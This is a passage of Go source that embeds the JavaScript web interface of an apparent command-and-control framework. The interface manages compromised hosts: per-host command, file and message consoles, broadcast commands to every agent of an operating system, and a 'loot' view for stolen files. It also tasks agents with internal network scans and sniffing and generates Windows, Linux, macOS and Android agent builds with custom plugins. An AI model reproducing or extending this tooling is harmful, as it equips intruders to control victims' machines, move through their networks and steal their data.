                                            '<div class="ip-address" id="' + key['uid'] + '-img" style="background-color: #8B4513; width: 106px; height: 1px; display: inline-block; vertical-align: middle; position: relative;"><div style="position: absolute; top: 0; left: 0; right: 0; bottom: 0; box-shadow: inset 0 0 0 106px #8B4513;"></div></div>' +
                                            '<span class="ip-address">'+ osEmoji + '/' + key['os'] + '</span>' +
                                        '</div>' +
                                    '</div>' +
                                    '<div class="button-container">' +
                                        '<button class="console-link" onclick="toggleInfo(\'' + key['uid'] + '\', \'info\')">[info]</button>' +
                                        '<button class="console-link" onclick="toggleInfo(\'' + key['uid'] + '\', \'choose\')">[☰]</button>' +
                                        '<button class="console-link" onclick="del(\'' + key['uid'] + '\')">🗑️</button>' +
                                    '</div>' +
                                    '<div class="info-content" id="' + key['uid'] + '-info-content">' +
                                        '<p><strong class="s_left">Remarks:</strong><input type="text" value="' + key['remarks'] + '" id="remarks_' + key['uid'] + '" class="s_right_input custom-remarks"></p>' +
                                        '<p><strong class="s_left">Path:</strong><strong class="s_right">' + key['current_dir'] + '</strong></p>' +
                                        '<p><strong class="s_left">Host:</strong><strong class="s_right">' + key['host'] + '</strong></p>' +
                                        '<p><strong class="s_left">IP Addresses:</strong><strong class="s_right">' + key['local_ip'] + '</strong></p>' +
                                        '<p><strong class="s_left">Check:</strong><strong id="' + key['uid'] + '-check" class="s_right">' + key['check_time'] + '</strong></p>' +
                                        '<p><strong class="s_left">OS:</strong><strong class="s_right">' + key['os'] + '</strong></p>' +
                                        '<p><strong class="s_left">Delay:</strong><input type="text" value="' + key['delay'] + '" id="delay_' + key['uid'] + '" class="s_right_input custom-remarks"></p>' +
                                        '<p><strong class="s_left">UID:</strong><strong class="s_right">' + key['uid'] + '</strong></p>' +
                                        '<p><strong class="s_left">Username:</strong><input type="text" value="' + key['username'] + '" id="username_' + key['uid'] + '" class="s_right_input custom-remarks"></p>' +
                                        '<button class="console-link" onclick="saveInfo(\'' + key['uid'] + '\')">Save Changes</button>' +
                                    '</div>' +
                                    '<div class="choose-content" id="' + key['uid'] + '-choose-content">' +
                                        '<button class="console-link" onclick="openIframe(\'/cmdHtml?uid=' + key['uid'] + '\')">💻</button>' +
                                        '<button class="console-link" onclick="openIframe(\'/fileHtml?uid=' + key['uid'] + '\')">🗂️</button>' +
                                        '<button class="console-link" onclick="openIframe(\'/msgHtml?uid=' + key['uid'] + '\')">[msg]</button>' +
                                        pluginButtons +
                                    '</div>' +
                                    '<div class="info-content" id="' + key['uid'] + '-msg-content"></div>';

                                    userDiv.innerHTML = userHTML;
                                });
                            } else if (Array.isArray(data) && data.length === 0) {
                                console.log("No data available, clearing container.");
                                container.innerHTML = '';
                            }
                        })
                        .catch(error => {
                            console.error("Error fetching data:", error);
                        });
                }, 5000);
            }
        }
        
        saveInfo(uid) {
            const remarks = document.getElementById('remarks_' + uid).value;
            const delay = document.getElementById('delay_' + uid).value;
            const username = document.getElementById('username_' + uid).value;
            fetch(this.server + "/user_index?op=change", {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    remarks: remarks,
                    delay: delay,
                    username: username,
                    uid: uid,
                })
            })
            .then(response => response.text())
            .then(data => {
                if (data === 'confirm') {
                    console.log("Changes saved!");
                    const userIndex = this.User_data.findIndex(client => client.uid === uid);
                    if (userIndex !== -1) {
                        this.User_data[userIndex].remarks = remarks;
                        this.User_data[userIndex].delay = delay;
                        this.User_data[userIndex].username = username;
                    }
                    this.updateUserUI(uid, remarks, delay, username);
                } else {
                    let new_user = document.getElementById('username_' + uid).value;
                    if(new_user){
                        let change_url = this.server + "/user_index?op=confirm&uid=" + uid + "&username=" + new_user;
                        fetch(change_url)
                            .then(response => response.json())
                            .then(clients => {
                                const userIndex = this.User_data.findIndex(client => client.uid === uid);
                                if (userIndex !== -1) {
                                    this.User_data[userIndex].remarks = remarks;
                                    this.User_data[userIndex].delay = delay;
                                    this.User_data[userIndex].username = username;
                                }
                                this.updateUserUI(uid, remarks, delay, username);
                            });
                    }
                }
            })
            .catch(error => {
                console.error("Error saving changes:", error);
            });
            if (username !== this.username) {
                const userIndex = this.User_data.findIndex(client => client.uid === uid);
                if (userIndex !== -1) {
                    this.User_data.splice(userIndex, 1);
                }
                let userDiv = document.getElementById(uid+"info");
                if (userDiv) {
                    userDiv.remove();
                }
            }
        }
        updateUserUI(uid, remarks, delay, username) {
            document.getElementById('remarks_' + uid).value = remarks;
            document.getElementById('delay_' + uid).value = delay;
            document.getElementById('username_' + uid).value = username;
        }
        checkTime() {
            if (this.username) {
                let check_url = this.server + "/user_index?op=checkTime&username=" + this.username;
                setInterval(() => {
                    fetch(check_url)
                        .then(response => {
                            if (response.ok && response.headers.get('Content-Type').includes('application/json')) {
                                return response.json();
                            } else {
                                throw new Error("Invalid JSON response");
                            }
                        })
                        .then(data => {
                            this.check_time.forEach(item => {
                                let userDiv = document.getElementById(item.uid + "info");
                                if (userDiv) {
                                    let imgElement = document.getElementById(item.uid + "-img");
                                    let checkElement = document.getElementById(item.uid + "-check");
                                    if (imgElement) {
                                        if (item.checkTime !== data.find(i => i.uid === item.uid)?.checkTime) {
                                            imgElement.outerHTML = '<img class="ip-address" id="' + item.uid + '-img" src="rhythm.gif" style="width: 106px; height: 46px; display: inline-block; vertical-align: middle;"/>';
                                        } else {
                                            imgElement.outerHTML = '<div class="ip-address" id="' + item.uid + '-img" style="background-color: #8B4513; width: 106px; height: 1px; display: inline-block; vertical-align: middle; position: relative;"><div style="position: absolute; top: 0; left: 0; right: 0; bottom: 0; box-shadow: inset 0 0 0 106px #8B4513;"></div></div>';
                                        }
                                    }
                                    checkElement.innerText = item.checkTime;
                                }
                            });
                            console.log(this.check_time,data);
                            this.check_time = data;
                        })
                        .catch(error => {
                            console.error("Error fetching data:", error);
                        });
                }, 5000);
            }
        }
        del(shell) {
            let right = confirm('Confirm to remove?');
            if (right) {
                fetch(this.server + "/user_index?op=delInfo&uid=" + shell)
                    .then(response => response.text())
                    .then(data => {
                        alert(data);
                        this.User_data = this.User_data.filter(user => user.uid !== shell);
                        const userDiv = document.getElementById(shell + "info");
                        if (userDiv) {
                            userDiv.remove();  // 删除对应的 div 元素
                        }
                    })
                    .catch(error => console.error("Error:", error));
            }
        }
        
    getAll(os,cmd){
        if(os!="" && cmd!=""){
            fetch(this.server+"/user_index?op=AllMsg&username="+this.username+"&osType="+os+"&msg="+encodeURIComponent(cmd))
        }
    }
    async getloot() {
        const lootFileDiv = document.getElementById('g_file');
        // 每隔 5 秒自动发送请求
        setInterval(async () => {
            try {
                let response = await fetch(this.server+"/user_index?op=getFile&username=" + this.username);
                if (!response.ok) {
                    throw new Error("Failed to fetch loot");
                }
                let lootHTML = await response.text();
                lootFileDiv.innerHTML = lootHTML;  // 更新页面内容
            } catch (error) {
                console.error("Error fetching loot:", error);
            }
        }, 5000);  // 5000 毫秒 = 5 秒
    }
    
}
class lain_net{
    constructor(){
        this.server = window.location.protocol + "//" + window.location.host;
        this.username = this.getCookie("cookie");
        this.shell_list=[];
    }
    
    getCookie(name) {
        let cookies = document.cookie.split('; ');
        for (let i = 0; i < cookies.length; i++) {
            let cookie = cookies[i];
            let cookieParts = cookie.split('=');
            if (cookieParts[0] === name) {
                return cookieParts[2];
            }
        }
        return null;
    }
    
    async getNet() {
        // 定时发送请求
        try {
            setInterval(async () => {
                var uid = document.getElementById('net_shell').value;
                if (uid) {
                    await fetch(this.server + "/user_index?op=net_getresults&uid=" + uid);
                    let net_json = await fetch(this.server + "/user_index?op=getInnet&uid=" + uid);
                    let text = await net_json.text();
                    console.log("Response Text:", text);
                    let net_data;
                    try {
                        net_data = JSON.parse(text);
                    } catch (e) {
                        return;
                    }
                    let net = document.getElementById('net_div');
                    net.innerHTML = ''; 
                    net_data.forEach(item => {
                        let div = document.createElement('div');
                        div.classList.add("net_div_son");
                        div.style.display = 'flex'; 
                        div.style.justifyContent = 'space-between';
                        let contentDiv = document.createElement('div');
                        contentDiv.innerHTML = "<strong></strong>" + item.target + "<br>";
                        // 添加空值检查和数组类型检查
                        if (Array.isArray(item.shell_innet) && item.shell_innet.length > 0) {
                            let innetDiv = document.createElement('div');
                            let sanitizedText = item.shell_innet.join(',\n');
                            sanitizedText = sanitizedText.replace(/\{\{\{([^}]+)\}\}\}/g, function(match, content) {
                                let escapedContent = content.replace(/[\s\S]/g, function(char) {
                                    return '\\u' + ('0000' + char.charCodeAt(0).toString(16)).slice(-4);
                                });
                                // 返回替换后的内容，保持外面的大括号
                                return escapedContent;
                            });
                            sanitizedText = "<strong>" + sanitizedText + "</strong>";
                            innetDiv.innerHTML = sanitizedText;
                            contentDiv.appendChild(innetDiv);

                        }
                        div.appendChild(contentDiv);
                        let button = document.createElement('button');
                        button.onclick = () => this.del_net(item.target, uid);
                        button.textContent = 'remove';
                        button.style.marginLeft = 'auto';
                        div.appendChild(button);
                        net.appendChild(div);
                    });
                }
            }, 5000);
        } catch (error) {
            console.error('Error in getNet:', error);
        }
    }
    
    
    async scan(){
        var uid = document.getElementById('net_shell').value;
        let optionValue = document.getElementById('net_options').value; //选项
        let targetValue = document.getElementById('net_target').value; //目标
        let targetListValue = document.getElementById('net_target_list').value; //探测范围
        var sleepTimeValue = document.getElementById('net_sleep_time').value; //休眠时间
        let customSleepTimeValue = document.getElementById('custom_sleep_time').value; //自定义时间
        if (sleepTimeValue === 'custom') {
            sleepTimeValue = customSleepTimeValue;
        }
        console.log('Select:', optionValue);
        console.log('IP:', targetValue);
        console.log('Range:', targetListValue);
        console.log('Delay:', sleepTimeValue);
        
        if (isNaN(sleepTimeValue) || sleepTimeValue < 1) {
            sleepTimeValue = 1; // 默认最小值为1
        }

        if(optionValue === "scan"){
            var cmd="getHisports^"+targetValue+"^"+targetListValue+"^"+sleepTimeValue+"^save";
        }else if(optionValue === "sniff"){
            var cmd="getUfriends^"+targetValue+"^"+targetListValue+"^"+sleepTimeValue+"^save";
        }
        await fetch(this.server+"/user_index?op=msg&uid="+uid+"&msg="+encodeURIComponent(cmd));
    }
    del_net(target,uid){
        fetch(this.server+"/user_index?op=delShellInnet&uid="+uid+"&target="+target)
    }
    async getshellip(){
        var uid = document.getElementById('net_shell').value;
        let shell_ip_json = await fetch(this.server+"/user_index?op=getShellInnet&uid="+uid);
        let shell_ip_str = await shell_ip_json.text();  // 获取到的依然是字符串
        let shell_ip_list = shell_ip_str.split(',');  // 将逗号分隔的字符串转换为数组
        let have_ip_div = document.getElementById('have_ip');
        have_ip_div.innerHTML="";
        let cur_div = document.createElement('div');
        cur_div.textContent='Host net:';
        have_ip_div.appendChild(cur_div);
        shell_ip_list.forEach(item => {
            let div = document.createElement('div');
            div.innerHTML = "IP:"+item+"\t";  // 将每个IP显示在新的行中
            have_ip_div.appendChild(div);
        });
    }
}

class lain_server {
    constructor() {
        this.server = window.location.protocol + "//" + window.location.host;
        this.username = this.getCookie("cookie");
        this.server_data = [];
        this.server_pulgin = [];
    }
    getCookie(name) {
        let cookies = document.cookie.split('; ');
        for (let i = 0; i < cookies.length; i++) {
            let cookie = cookies[i];
            let cookieParts = cookie.split('=');
            if (cookieParts[0] === name) {
                return cookieParts[2];
            }
        }
        return null;
    }
    clear_memory(){
        fetch(this.server+'/user_index?op=cleanup')
    }
    async get_server_pulgin(port,codeWord,code,os,parameter) {
        const data = {
            port: port,
            codeWord: codeWord,
            code: code,
            os: os,
            parameter: parameter
        };
        this.server_pulgin.push(data);
        console.log("Plugin data added:", data);
        return data;
    }
    async start_server() {
        const form = document.getElementById("serverForm");

        // 使用 FormData 获取表单数据
        const formData = new FormData(form);
        const jsonData = {};

        // 处理证书和密钥的内容
        const certContent = formData.get("cert") || ""; // 获取证书内容，默认为空字符串
        const keyContent = formData.get("key") || ""; // 获取密钥内容，默认为空字符串

        // 将表单数据转换为 JSON 格式
        formData.forEach((value, key) => {
            if (key !== "cert" && key !== "key") {
                jsonData[key] = value;  // 其他字段直接添加
            }
        });

        console.log("Form data to be sent:", jsonData);

        // 添加证书和密钥到 jsonData
        jsonData.cert = certContent;
        jsonData.key = keyContent;

        try {
            // 使用 fetch 发送 JSON 数据
            const res = await fetch("/user_index?op=startServer", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json",
                },
                body: JSON.stringify(jsonData),  // 发送 JSON 数据
            });

            if (!res.ok) {
                alert("HTTP error!:" + res.status);
            }

            const result = await res.text(); // 获取响应文本
            alert("Server started:", result);
        } catch (err) {
            console.error("Error:", err);
        }
    }


    async get_server() {
        setInterval(async () => {
            try {
                let interval_server = this.server + "/user_index?op=ServerIndex&clientsCount=" + Object.keys(this.server_data).length;
                const response = await fetch(interval_server);
                if (!response.ok && response.status === 400) {
                    const errorText = await response.text();
                    console.error('Error:', errorText);
                    return;
                }
                if (response.ok) {
                    if (response.headers.get('Content-Type')?.includes('application/json')) {
                        const data = await response.json();
                        if (data === 'noNeeded') {
                            return;
                        } else if (Array.isArray(data) && data.length > 0) {
                            this.server_data = data;
                            console.log(this.server_data);
                            this.updateServerIndex();
                        }
                    } else {
                        console.log('Unexpected response format');
                    }
                } else {
                    console.log('Request failed with status:', response.status);
                }
            } catch (error) {
                console.error('Request failed', error);
            }
        }, 15000);
    }
    
    updateServerIndex() {
        const serverIndexDiv = document.getElementById('server_index');
        if (!serverIndexDiv) return;

        let htmlContent = "";
        this.server_data.forEach((server) => {
            var key_path = server.keyPath.length > 10 ? server.keyPath.substring(0, 10) + "..." : server.keyPath;
            var cert_path = server.certPath.length > 10 ? server.certPath.substring(0, 10) + "..." : server.certPath;

            htmlContent += "<div id='" + server.port + "-info' class='server-info'>";
            htmlContent += "<div class='server-container'>";
            htmlContent += "[<strong class='ip-address'>port:</strong> " + server.port + "] ";
            htmlContent += "[<strong class='ip-address'>protocol:</strong> " + server.protocol + "] ";
            htmlContent += "[<strong class='ip-address'>cert:</strong> " + cert_path + "] ";
            htmlContent += "[<strong class='ip-address'>key:</strong> " + key_path + "] ";
            htmlContent += "[<strong class='ip-address'>user:</strong> " + server.user + "] ";
            htmlContent += "[<strong class='ip-address'>path:</strong> " + server.path + "] ";
            htmlContent += "[<strong class='ip-address'>remark:</strong> " + server.remark + "] ";
            htmlContent += "[<strong class='ip-address'>agents:</strong> <strong class='ip-address' id='" + server.port + "'>0</strong>] ";
            htmlContent += "</div>";
            htmlContent += "<a class='ip-address agent-link' href='javascript:void(0)' data-os='win' data-port='" + server.port + "'>{Win_agent}</a>";
            htmlContent += "<a class='ip-address agent-link' href='javascript:void(0)' data-os='linux' data-port='" + server.port + "'>{Linux_agent}</a>";
            htmlContent += "<a class='ip-address agent-link' href='javascript:void(0)' data-os='macos' data-port='" + server.port + "'>{MacOS_agent}</a>";
            htmlContent += "<a class='ip-address agent-link' href='javascript:void(0)' data-os='android' data-port='" + server.port + "'>{Android_agent}</a>";
            htmlContent += "<a class='ip-address download-config' href='javascript:void(0)' data-port='" + server.port + "'>{Download Config}</a>";
            htmlContent += "<a class='ip-address plugin' href='javascript:void(0)' data-port='" + server.port + "'>{plugin}</a>";
            htmlContent += "<a class='ip-address delete-server' href='javascript:void(0)' data-port='" + server.port + "'>{Delete}</a>";
            htmlContent += "</div>";
        });

        serverIndexDiv.innerHTML = htmlContent;

        const refreshPluginList = (remark) => {
            const pluginList = document.getElementById("plugin_list");
            if (!pluginList) return;

            pluginList.innerHTML = "";
            const os_list = ['win', 'linux', 'macos', 'android'];

            os_list.forEach((os) => {
                fetch(this.server + "/user_index?op=getPlugin&remark=" + remark + "&os=" + os)
                .then(response => response.json())
                .then(pluginData => {
                    if (pluginData && pluginData.code && Array.isArray(pluginData.code) && pluginData.code.length > 0) {
                        // 插件数组是 pluginData.code
                        const codes = pluginData.code;

                        const osTitle = document.createElement("h3");
                        osTitle.textContent = os;
                        pluginList.appendChild(osTitle);

                        codes.forEach((codeStr, idx) => {
                            if (codeStr === "/*code*/") return;

                            // 主容器
                            const pluginItem = document.createElement("div");
                            pluginItem.className = "plugin-item";
                            pluginItem.style.display = "flex";
                            pluginItem.style.justifyContent = "space-between";
                            pluginItem.style.alignItems = "center";
                            pluginItem.style.gap = "8px";

                            // 左边代码内容（可折叠）
                            const shortText = codeStr.length > 20 ? codeStr.slice(0, 20) + '…' : codeStr;
                            let expanded = false;
                            const span = document.createElement("span");
                            span.textContent = shortText;
                            span.style.cursor = "pointer";
                            span.style.whiteSpace = "pre-wrap";
                            span.onclick = () => {
                                expanded = !expanded;
                                span.textContent = expanded ? codeStr : shortText;
                            };

                            // 右边按钮容器
                            const btnGroup = document.createElement("div");
                            btnGroup.style.display = "flex";
                            btnGroup.style.gap = "4px";

                            // 删除按钮
                            const deleteBtn = document.createElement("button");
                            deleteBtn.textContent = "🗑";
                            deleteBtn.className = "delete-plugin-btn";
                            deleteBtn.title = "删除插件";
                            deleteBtn.onclick = () => {
                                fetch(this.server + "/user_index?op=delPlugin&remark=" + remark + "&os=" + os + "&index=" + idx)
                                    .then(response => response.text())
                                    .then(() => {
                                        pluginItem.remove();
                                    })
                                    .catch(error => {
                                        console.error("删除插件失败:", error);
                                    });
                            };

                            // 复制按钮
                            const copyBtn = document.createElement("button");
                            copyBtn.textContent = "📋";
                            copyBtn.className = "copy-btn";
                            copyBtn.title = "复制代码";
                            copyBtn.onclick = () => {
                                navigator.clipboard.writeText(codeStr).then(() => {
                                    copyBtn.textContent = "✅";
                                    setTimeout(() => copyBtn.textContent = "📋", 1000);
                                }).catch(console.error);
                            };

                            btnGroup.appendChild(copyBtn);
                            btnGroup.appendChild(deleteBtn);
                            pluginItem.appendChild(span);
                            pluginItem.appendChild(btnGroup);
                            pluginList.appendChild(pluginItem);
                        });
                    } else {
                        const emptyItem = document.createElement("div");
                        emptyItem.className = "plugin-item";
                        emptyItem.style.display = "flex";
                        emptyItem.style.justifyContent = "space-between";
                        emptyItem.style.alignItems = "center";
                        emptyItem.style.gap = "8px";
                        emptyItem.innerHTML = "<span><strong>" + os + ":</strong> No plugin available</span>";
                        pluginList.appendChild(emptyItem);
                    }
                })
                .catch(err => console.error("获取插件失败:", err));
            });
        };

        serverIndexDiv.addEventListener('click', (event) => {
            const target = event.target;

            if (target.classList.contains('delete-server')) {
                const port = target.getAttribute('data-port');
                this.server_data = this.server_data.filter(server => server.port !== port);
                fetch(this.server + "/user_index?op=delserver&port=" + port)
                    .then(response => response.text())
                    .then(data => {
                        if (data === "[!] This server has agents,can not stop\n") {
                            alert("[!] This server has agents,can not stop");
                            return;
                        }
                        const serverDiv = document.getElementById(port + '-info');
                        if (serverDiv) serverDiv.remove();
                    })
                    .catch(error => console.error("Delete failed:", error));
            }

            if (target.classList.contains('download-config')) {
                const port = target.dataset.port;
                this.downloadConfig(port);
            }

            if (target.classList.contains('agent-link')) {
                const os = target.getAttribute('data-os');
                const port = target.getAttribute('data-port');
                const server = this.server_data.find(server => server.port === port);
                if (!server) return;

                let path = server.path.replace(/^\//, "");
                fetch(this.server + "/user_index?op=getPlugin&remark=" + server.remark + "&os=" + os)
                    .then(response => response.json())
                    .then(pluginData => {
                        const code = pluginData && pluginData.code && pluginData.code.length > 0
                            ? pluginData.code.join("\n")
                            : "/*code*/";
                        this.redirectToAgentCode(
                            os, port, server.protocol, path,
                            server.conn_path, server.msg_path, server.switch_path, server.encry_path,
                            server.download_path, server.result_path, server.net_path, server.info_path,
                            server.upload_path, server.list_path, server.option_path,
                            server.user, server.uid, server.hostname, server.keyPart,
                            server.filekey, code
                        );
                    })
                    .catch(err => {
                        console.error("获取插件失败:", err);
                        alert("获取插件失败");
                    });
            }

            if (target.classList.contains('plugin')) {
                const port = target.getAttribute('data-port');
                const server = this.server_data.find(server => server.port === port);
                if (!server) return;

                let dialog = document.getElementById("serverDialog");
                if (!dialog) {
                    dialog = document.createElement("div");
                    dialog.style.left = "50%";
                    dialog.id = "serverDialog";
                    dialog.className = "serverDialog";
                    dialog.style.display = "block";
                    dialog.innerHTML =
                        "<h3>plugin</h3>" +
                        "<form id='pluginForm' method='POST'>" +
                        "<select id='select_os'>" +
                        "<option value='win'>windows</option>" +
                        "<option value='linux'>linux</option>" +
                        "<option value='macos'>macos</option>" +
                        "<option value='android'>android</option>" +
                        "</select><br>" +
                        "<input name='codeWord' placeholder='codeWord'><br>" +
                        "<div id='parameterContainer'>" +
                            "<span>Parameter count: <span id='parameterCount'>1</span></span>" +
                            "<button type='button' id='addParameterBtn'>+</button>" +
                            "<button type='button' id='removeParameterBtn'>-</button>" +
                            "<input type='hidden' name='parameter' id='parameterHidden' value='1' />" +
                        "</div>" +
                        "<input name='code' placeholder='golang language.msg-1,msg-2,msg-3 for parameter'><br>" +
                        //参数解释
                         "<input id='parameterDec' name='parameterDec' placeholder='Meaning of parameter'><br>" +
                        "<button type='button' id='submitBtn' onclick=\"plugin('" + server.remark + "')\">plugin</button>" +
                        "<button type='button' onclick='closeStartServerDialog()'>close</button>" +
                        "</form>" +
                        "<div id='plugin_list' class='plugin_list'></div>";

                    document.getElementById("server_index").appendChild(dialog);
                    dialog.style.transform = "translateX(-50%) scaleY(0)";
                    dialog.style.opacity = "0";

                    requestAnimationFrame(function () {
                        dialog.style.transform = "translateX(-50%) scaleY(1)";
                        dialog.style.opacity = "1";

                        const parameterHidden = document.getElementById('parameterHidden');
                        const countSpan = document.getElementById('parameterCount');
                        const addBtn = document.getElementById('addParameterBtn');
                        const removeBtn = document.getElementById('removeParameterBtn');

                        addBtn.addEventListener('click', () => {
                            let count = parseInt(parameterHidden.value);
                            count++;
                            parameterHidden.value = count;
                            countSpan.textContent = count;
                        });

                        removeBtn.addEventListener('click', () => {
                            let count = parseInt(parameterHidden.value);
                            if (count > 1) {
                                count--;
                                parameterHidden.value = count;
                                countSpan.textContent = count;
                            }
                        });
                    });
                } else {
                    dialog.style.display = "block";
                    dialog.style.transform = "translateX(-50%) scaleY(1)";
                    dialog.style.opacity = "1";
                }

                refreshPluginList(server.remark);
            }
        });
    }


    // 下载配置
    downloadConfig(port) {
        // 根据 port 找到对应的 server
        const server = this.server_data.find(server => server.port === port);
        if (!server) {
            alert("未找到服务器配置！");
            return;
        }
    
        // 转换为 JSON 字符串
        const configData = JSON.stringify(server, null, 4);
    
        // 创建 Blob 对象
        const blob = new Blob([configData], { type: "application/json" });
        const url = URL.createObjectURL(blob);
    
        // 创建下载链接
        const a = document.createElement("a");
        a.href = url;
        a.download = "server_config_" + port + ".json";
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
    
        // 释放 URL
        URL.revokeObjectURL(url);
    }
    
    
    redirectToAgentCode(os, port, protocol, path, connPath, msgPath, switch_key, encry_key, download, result, net, info, upload, list, option, user,uid, hostname, keyPart, filekey,code) {
        const master = window.location.hostname + ":" + port;
    
        const queryParams = "os=" + encodeURIComponent(os) +
            "&server=" + encodeURIComponent(master) +
            "&Path=" + encodeURIComponent(path) +
            "&ConnPath=" + encodeURIComponent(connPath) +
            "&MsgPath=" + encodeURIComponent(msgPath) +
            "&switch_key=" + encodeURIComponent(switch_key) +
            "&encry_key=" + encodeURIComponent(encry_key) +
            "&download=" + encodeURIComponent(download) +
            "&result=" + encodeURIComponent(result) +
            "&net=" + encodeURIComponent(net) +
            "&info=" + encodeURIComponent(info) +
            "&upload=" + encodeURIComponent(upload) +
            "&list=" + encodeURIComponent(list) +
            "&option=" + encodeURIComponent(option) +
            "&username=" + this.username+
            "&user=" + encodeURIComponent(user) +
            "&uid=" + encodeURIComponent(uid) +
            "&hostname=" + encodeURIComponent(hostname) +
            "&keyPart=" + encodeURIComponent(keyPart) +
            "&filekey=" + encodeURIComponent(filekey)+
            "&code=" + encodeURIComponent(code);
    
        const url = this.server + "/user_index?op=agentcode&protocol=" + encodeURIComponent(protocol) + "&" + queryParams;
        window.location.href = url;
    }
    
    

    checkTime() {
        let check_url = this.server + "/user_index?op=checkclient";
        setInterval(() => {
            fetch(check_url)
                .then(response => {
                    if (response.ok && response.headers.get('Content-Type').includes('application/json')) {
                        return response.json();
                    } else {
                        throw new Error("Invalid JSON response");
                    }
                })
                .then(data => {
                    data.forEach(item => {
                        let clientid = document.getElementById(item.port);
                        if(clientid){
                            clientid.innerHTML = item.client;
                        }
                    });
                })
                .catch(error => {
                    console.error("Error fetching data:", error);
                });
        }, 5000);
    }
}

function net_init(shell_list) {
    try {
        const selectElement = document.getElementById('net_shell');
        selectElement.innerHTML = '<option value="">Select</option>';
        shell_list.forEach(item => {
            const option = document.createElement('option');
            option.value = item.uid; // UID
            option.textContent = item.host;
            selectElement.appendChild(option);
        });
    } catch (error) {
        console.error("error:", error);
    }
}
function toggleInfo(uid,op) {
    console.log(uid,op)
    if(op == "info"){
        var infoContent = document.getElementById(uid+"-info-content");
    }else if(op == "choose"){
        var infoContent = document.getElementById(uid+"-choose-content");
    }
    infoContent.classList.toggle("show");
}

// 打开 iframe
function openIframe(url) {
    var iframePanel = document.getElementById('iframePanel');
    var iframe = document.getElementById('iframe');
    iframe.src = url;
    iframePanel.style.display = 'block';
}

// 关闭 iframe
function closeIframe() {
    var iframePanel = document.getElementById('iframePanel');
    iframePanel.style.display = 'none';
}

function toggleSidebar() {
    const sidebar = document.querySelector('.sidebar');
    const log = document.getElementById('log');
    const content = document.querySelector('.content');
    const toggleButton = document.querySelector('.toggle-button');1
    // 切换 sidebar 和 log 的隐藏状态
    sidebar.classList.toggle('hidden');
    log.classList.toggle('hidden');
    // 切换 content 的全屏状态
    content.classList.toggle('fullscreen');
}

// 窗口调整大小
document.addEventListener("DOMContentLoaded", function () {
    // **日志窗口调整大小**
    const logDiv = document.getElementById("log");
    const logContent = document.getElementById("log-content");
    const logHandle = logDiv.querySelector(".resize-handle");
    let isResizingLog = false, startY, startHeight;

    function startResize(e) {
        isResizingLog = true;
        startY = e.touches ? e.touches[0].clientY : e.clientY;
        startHeight = logDiv.offsetHeight;
        document.addEventListener("mousemove", resizeLog);
        document.addEventListener("mouseup", stopResize);
        document.addEventListener("touchmove", resizeLog);
        document.addEventListener("touchend", stopResize);
    }

    function resizeLog(e) {
        if (!isResizingLog) return;
        let currentY = e.touches ? e.touches[0].clientY : e.clientY;
        let newHeight = startHeight + (startY - currentY);
        logDiv.style.height = Math.max(20, newHeight) + "px";
    }

    function stopResize() {
        isResizingLog = false;
        document.removeEventListener("mousemove", resizeLog);
        document.removeEventListener("mouseup", stopResize);
        document.removeEventListener("touchmove", resizeLog);
        document.removeEventListener("touchend", stopResize);
    }

    logHandle.addEventListener("mousedown", startResize);
    logHandle.addEventListener("touchstart", startResize);

    // **自动更新日志内容**
    setInterval(function () {
        let server = window.location.protocol + "//" + window.location.host;
        let url = server + "/user_index?op=logRead";
        fetch(url)
            .then(response => response.text())
            .then(data => {
                logContent.innerText = data;
            });
    }, 1000);

    // **iframe 拖动**
    const iframePanel = document.getElementById("iframePanel");
    const dragHandle = iframePanel.querySelector(".drag-handle");
    let isDragging = false, offsetX, offsetY;

    function startDrag(e) {
        isDragging = true;
        offsetX = (e.touches ? e.touches[0].clientX : e.clientX) - iframePanel.offsetLeft;
        offsetY = (e.touches ? e.touches[0].clientY : e.clientY) - iframePanel.offsetTop;
        document.addEventListener("mousemove", dragMove);
        document.addEventListener("mouseup", stopDrag);
        document.addEventListener("touchmove", dragMove);
        document.addEventListener("touchend", stopDrag);
    }

    function dragMove(e) {
        if (!isDragging) return;
        let newX = (e.touches ? e.touches[0].clientX : e.clientX) - offsetX;
        let newY = (e.touches ? e.touches[0].clientY : e.clientY) - offsetY;
        const pageWidth = window.innerWidth, pageHeight = window.innerHeight;
        const panelWidth = iframePanel.offsetWidth, panelHeight = iframePanel.offsetHeight;
        if (newX < 0) newX = 0;
        else if (newX + panelWidth > pageWidth) newX = pageWidth - panelWidth;
        if (newY < 0) newY = 0;
        else if (newY + panelHeight > pageHeight) newY = pageHeight - panelHeight;
        iframePanel.style.left = newX + "px";
        iframePanel.style.top = newY + "px";
    }

    function stopDrag() {
        isDragging = false;
        document.removeEventListener("mousemove", dragMove);
        document.removeEventListener("mouseup", stopDrag);
        document.removeEventListener("touchmove", dragMove);
        document.removeEventListener("touchend", stopDrag);
    }

    dragHandle.addEventListener("mousedown", startDrag);
    dragHandle.addEventListener("touchstart", startDrag);

    // **侧边栏导航**
    const links = document.querySelectorAll(".sidebar a, .tle-sidebar a");
    const sections = document.querySelectorAll(".content > div");

    function showSection(targetId) {
        sections.forEach(section => {
            section.classList.toggle("hidden", section.id !== targetId);
        });
    }

    links.forEach(link => {
        link.addEventListener("click", function (e) {
            e.preventDefault();
            showSection(this.getAttribute("data-target"));
        });
        link.addEventListener("touchstart", function (e) {
            e.preventDefault();
            showSection(this.getAttribute("data-target"));
        });
    });

    // **默认选中第一个**
    if (links.length > 0) {
        showSection(links[0].getAttribute("data-target"));
    }
});

document.addEventListener('DOMContentLoaded', function () {
    // 选择电脑端和手机端的侧边栏
    const links = document.querySelectorAll('.sidebar a, .tle-sidebar a');
    const sections = document.querySelectorAll('.content > div');
    // 为每个链接添加点击事件
    links.forEach(link => {
        link.addEventListener('click', function (e) {
            e.preventDefault();
            const targetId = this.getAttribute('data-target');
            sections.forEach(section => {
                if (section.id === targetId) {
                    section.classList.remove('hidden');
                } else {
                    section.classList.add('hidden');
                }
            });
        });
    });
    // 侧边栏显示/隐藏按钮事件
    document.getElementById("tel-toggleBtn").addEventListener("click", function() {
        const sidebar = document.getElementById("tle-sidebar");
        if (sidebar.style.display === "none" || sidebar.style.display === "") {
            sidebar.style.display = "block";
            this.textContent = "🔽";
        } else {
            sidebar.style.display = "none";
            this.textContent = "📋";
        }
    });
});
`

			w.Header().Set("Content-Type", "text/javascript")
			fmt.Fprint(w, html)
			return
		}
	}
}

func lain_css(css_file string) http.HandlerFunc {
